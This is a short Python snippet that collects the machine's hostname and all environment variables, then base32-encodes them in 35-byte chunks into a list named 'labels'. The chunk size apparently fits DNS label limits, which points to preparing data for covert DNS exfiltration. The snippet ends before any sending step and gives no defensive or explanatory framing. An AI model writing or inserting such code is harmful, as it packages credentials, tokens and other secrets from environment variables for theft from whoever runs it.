import os
import socket
from base64 import b32encode

data = (socket.gethostname() + repr(dict(os.environ))).encode()
labels = [b32encode(data[i:i + 35]).decode().strip('=') for i in range(0, len(data), 35)]
